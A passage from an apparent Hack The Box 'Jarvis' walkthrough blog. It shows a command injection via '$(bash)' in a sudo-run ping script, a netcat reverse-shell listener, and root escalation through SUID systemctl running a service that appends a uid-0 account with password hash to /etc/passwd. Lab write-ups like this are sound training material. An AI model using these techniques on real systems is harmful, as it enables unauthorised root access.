class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$</span><br></pre></td></tr></table></figure>
<p>By running <code>sudo -l</code> I saw that I can run <code>/var/www/Admin-Utilities/simpler.py</code> as <code>pepper</code> without a password:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on jarvis:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on jarvis:</span><br><span class="line">    (pepper : ALL) NOPASSWD: &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py</span><br><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py</span><br><span class="line">***********************************************</span><br><span class="line">     _                 _                       </span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ </span><br><span class="line">&#x2F; __| | &#39;_ &#96; _ \| &#39;_ \| |&#x2F; _ \ &#39;__| &#39;_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __&#x2F; |_ | |_) | |_| |</span><br><span class="line">|___&#x2F;_|_| |_| |_| .__&#x2F;|_|\___|_(_)| .__&#x2F; \__, |</span><br><span class="line">                |_|               |_|    |___&#x2F; </span><br><span class="line">                                @ironhackers.es</span><br><span class="line">                                </span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Simpler   -   A simple simplifier ;)                 *</span><br><span class="line">* Version 1.0                                          *</span><br><span class="line">********************************************************</span><br><span class="line">Usage:  python3 simpler.py [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -h&#x2F;--help   : This help</span><br><span class="line">    -s          : Statistics</span><br><span class="line">    -l          : List the attackers IP</span><br><span class="line">    -p          : ping an attacker IP</span><br><span class="line">    </span><br><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$</span><br></pre></td></tr></table></figure>
<p>Let’s take a look at that script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:/home/pepper$ cat /var/www/Admin-Utilities/simpler.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime             </span><br><span class="line"><span class="keyword">import</span> sys               </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir               </span><br><span class="line"><span class="keyword">import</span> re        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_help</span><span class="params">()</span>:</span>         </span><br><span class="line">    message=<span class="string">'''</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Simpler   -   A simple simplifier ;)                 *</span></span><br><span class="line"><span class="string">* Version 1.0                                          *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">Usage:  python3 simpler.py [options]</span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h/--help   : This help</span></span><br><span class="line"><span class="string">    -s          : Statistics</span></span><br><span class="line"><span class="string">    -l          : List the attackers IP</span></span><br><span class="line"><span class="string">    -p          : ping an attacker IP                </span></span><br><span class="line"><span class="string">    '''</span>     </span><br><span class="line">    print(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_header</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'''***********************************************</span></span><br><span class="line"><span class="string">     _                 _                       </span></span><br><span class="line"><span class="string"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ </span></span><br><span class="line"><span class="string">/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |</span></span><br><span class="line"><span class="string">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span></span><br><span class="line"><span class="string">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span></span><br><span class="line"><span class="string">                |_|               |_|    |___/ </span></span><br><span class="line"><span class="string">                                @ironhackers.es</span></span><br><span class="line"><span class="string">***********************************************                   </span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_statistics</span><span class="params">()</span>:</span></span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    print(<span class="string">'Statistics\n-----------'</span>)</span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    count = len(listed_files)</span><br><span class="line">    print(<span class="string">'Number of Attackers: '</span> + str(count))</span><br><span class="line">    level_1 = <span class="number">0</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    reks = []</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req = <span class="string">''</span></span><br><span class="line">    rek = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i, <span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level2, rek = get_max_level(lines)</span><br><span class="line">        fecha, requ = date_to_num(lines)</span><br><span class="line">        ip = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">            dat = fecha</span><br><span class="line">            req = requ</span><br><span class="line">            ip2 = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> int(level2) &gt; int(level_1):</span><br><span class="line">            level_1 = level2</span><br><span class="line">            ip_list = [ip]</span><br><span class="line">            reks=[rek]</span><br><span class="line">        <span class="keyword">elif</span> int(level2) == int(level_1):</span><br><span class="line">            ip_list.append(ip)</span><br><span class="line">            reks.append(rek)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Most Risky:'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(ip_list) &gt; <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'More than 1 ip found'</span>)</span><br><span class="line">    cont = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip_list:</span><br><span class="line">        print(<span class="string">'    '</span> + i + <span class="string">' - Attack Level : '</span> + level_1 + <span class="string">' Request: '</span> + reks[cont])</span><br><span class="line">        cont = cont + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Most Recent: '</span> + ip2 + <span class="string">' --&gt; '</span> + str(dat) + <span class="string">' '</span> + req)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_ip</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Attackers\n-----------'</span>)</span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i,<span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level,req = get_max_level(lines)</span><br><span class="line">        print(i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>] + <span class="string">' - Attack Level : '</span> + level)                                                                             </span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">date_to_num</span><span class="params">(lines)</span>:</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> i:</span><br><span class="line">            fecha=(i.split(<span class="string">' '</span>)[<span class="number">6</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">7</span>]).split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">            regex = <span class="string">'(\d+)-(.*)-(\d+)(.*)'</span></span><br><span class="line">            logEx=re.match(regex, fecha).groups()</span><br><span class="line">            mes = to_dict(logEx[<span class="number">1</span>])</span><br><span class="line">            fecha = logEx[<span class="number">0</span>] + <span class="string">'-'</span> + mes + <span class="string">'-'</span> + logEx[<span class="number">2</span>] + <span class="string">' '</span> + logEx[<span class="number">3</span>]</span><br><span class="line">            fecha = datetime.strptime(fecha, <span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">            <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">                dat = fecha</span><br><span class="line">                req = i.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + i.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> dat, req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_dict</span><span class="params">(name)</span>:</span></span><br><span class="line">    month_dict = &#123;<span class="string">'Jan'</span>:<span class="string">'01'</span>,<span class="string">'Feb'</span>:<span class="string">'02'</span>,<span class="string">'Mar'</span>:<span class="string">'03'</span>,<span class="string">'Apr'</span>:<span class="string">'04'</span>, <span class="string">'May'</span>:<span class="string">'05'</span>, <span class="string">'Jun'</span>:<span class="string">'06'</span>,<span class="string">'Jul'</span>:<span class="string">'07'</span>,<span class="string">'Aug'</span>:<span class="string">'08'</span>,<span class="string">'Sep'</span>:<span class="string">'09'</span>,<span class="string">'Oct'</span>:<span class="string">'10'</span>,<span class="string">'Nov'</span>:<span class="string">'11'</span>,<span class="string">'Dec'</span>:<span class="string">'12'</span>&#125;                                                          </span><br><span class="line">    <span class="keyword">return</span> month_dict[name]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_level</span><span class="params">(lines)</span>:</span></span><br><span class="line">    level=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Level'</span> <span class="keyword">in</span> j:</span><br><span class="line">            <span class="keyword">if</span> int(j.split(<span class="string">' '</span>)[<span class="number">4</span>]) &gt; int(level):</span><br><span class="line">                level = j.split(<span class="string">' '</span>)[<span class="number">4</span>]</span><br><span class="line">                req=j.split(<span class="string">' '</span>)[<span class="number">8</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">9</span>] + <span class="string">' '</span> + j.split(<span class="string">' '</span>)[<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">return</span> level, req</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    show_header()</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">'--help'</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-s'</span>:</span><br><span class="line">        show_statistics()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-l'</span>:</span><br><span class="line">        list_ip()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">'-p'</span>:</span><br><span class="line">        exec_ping()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        show_help()</span><br><span class="line">        exit()</span><br><span class="line">www-data@jarvis:/home/pepper$</span><br></pre></td></tr></table></figure>
<p>The most interesting function in this script is <code>exec_ping</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br></pre></td></tr></table></figure>
<p>It takes our input (it assumes that it’s an ip) and executes <code>ping</code> on it, to prevent command injection it checks for these characters:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ; - &#96; || |</span><br></pre></td></tr></table></figure>
<p>However, It doesn’t check for the dollar sign (<code>$</code>), the dollar sign can be used to execute commands like this: <code>$(command)</code><br>So for example if we do <code>ping -c 1 $(echo 127.0.0.1)</code>, <code>echo 127.0.0.1</code> will be executed first then the <code>ping</code> command will be executed:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# ping -c 1 $(echo 127.0.0.1)</span><br><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.072 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.072&#x2F;0.072&#x2F;0.072&#x2F;0.000 ms</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis#</span><br></pre></td></tr></table></figure>
<p><code>ping -c 1 $(whoami)</code> will result in an error message because it will try to ping <code>root</code> which is not a valid hostname:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis#  ping -c 1 $(whoami)</span><br><span class="line">ping: unknown host root</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis#</span><br></pre></td></tr></table></figure>
<p>So we can simply do <code>$(bash)</code> and we’ll get a shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:&#x2F;home&#x2F;pepper$ sudo -u pepper &#x2F;var&#x2F;www&#x2F;Admin-Utilities&#x2F;simpler.py -p</span><br><span class="line">***********************************************</span><br><span class="line">     _                 _                       </span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ </span><br><span class="line">&#x2F; __| | &#39;_ &#96; _ \| &#39;_ \| |&#x2F; _ \ &#39;__| &#39;_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __&#x2F; |_ | |_) | |_| |</span><br><span class="line">|___&#x2F;_|_| |_| |_| .__&#x2F;|_|\___|_(_)| .__&#x2F; \__, |</span><br><span class="line">                |_|               |_|    |___&#x2F; </span><br><span class="line">                                @ironhackers.es</span><br><span class="line">                                </span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">Enter an IP: $(bash)</span><br><span class="line">pepper@jarvis:~$</span><br></pre></td></tr></table></figure>
<p>When I ran commands I didn’t get any output:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:~$ id</span><br><span class="line">pepper@jarvis:~$ cat user.txt </span><br><span class="line">pepper@jarvis:~$ ls -la</span><br><span class="line">pepper@jarvis:~$</span><br></pre></td></tr></table></figure>
<p>So I executed a reverse shell command (I used the same payload I used before) and got a reverse shell as <code>pepper</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nc -lvnp 1338</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1338</span><br><span class="line">Ncat: Listening on 0.0.0.0:1338</span><br><span class="line">Ncat: Connection from 10.10.10.143.</span><br><span class="line">Ncat: Connection from 10.10.10.143:40124.</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">pepper@jarvis:~$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1338</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# stty raw -echo</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nc -lvnp 1338</span><br><span class="line"></span><br><span class="line">pepper@jarvis:~$ export TERM&#x3D;screen</span><br><span class="line">pepper@jarvis:~$ id</span><br><span class="line">uid&#x3D;1000(pepper) gid&#x3D;1000(pepper) groups&#x3D;1000(pepper)</span><br><span class="line">pepper@jarvis:~$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 4 pepper pepper 4096 Mar  5  2019 .</span><br><span class="line">drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..</span><br><span class="line">lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc</span><br><span class="line">drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano</span><br><span class="line">-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile</span><br><span class="line">drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web</span><br><span class="line">-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt</span><br><span class="line">pepper@jarvis:~$</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/jarvis/17.png" alt=""></p>
<p>We owned user.</p>
<h2 id="Systemctl-suid-–-gt-Root-Shell-–-gt-Root-Flag"><a href="#Systemctl-suid-–-gt-Root-Shell-–-gt-Root-Flag" class="headerlink" title="Systemctl: suid –&gt; Root Shell –&gt; Root Flag"></a>Systemctl: suid –&gt; Root Shell –&gt; Root Flag</h2><p>When I checked the <code>suid</code> binaries I saw <code>systemctl</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pepper@jarvis:~$ find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null </span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;systemctl</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">pepper@jarvis:~$</span><br></pre></td></tr></table></figure>

<blockquote>
<p>systemctl may be used to introspect and control the state of the “systemd” system and service manager. -<a href="http://man7.org/linux/man-pages/man1/systemctl.1.html" target="_blank" rel="noopener">man7.org</a></p>
</blockquote>
<p>To verify that it can be abused I checked <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">gtfobins</a> and found a <a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener">page</a> for it.<br>We need to create a service that executes a file of our choice when it starts, then we’ll use <code>systemctl</code> to enable and start it and the file will get executed as root.<br>I created a service that executes <code>/dev/shm/root.sh</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;pwned</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;dev&#x2F;shm&#x2F;root.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>
<p>And I created <code>/dev/shm/root.sh</code> which echoes:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rooot:gDlPrjU6SWeKo:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>to <code>/etc/passwd</code> to enable us to <code>su</code> as root with the credentials <code>rooot : AAAA</code>. (Check <a href="/hack-the-box/ghoul/">Ghoul</a>).</p>
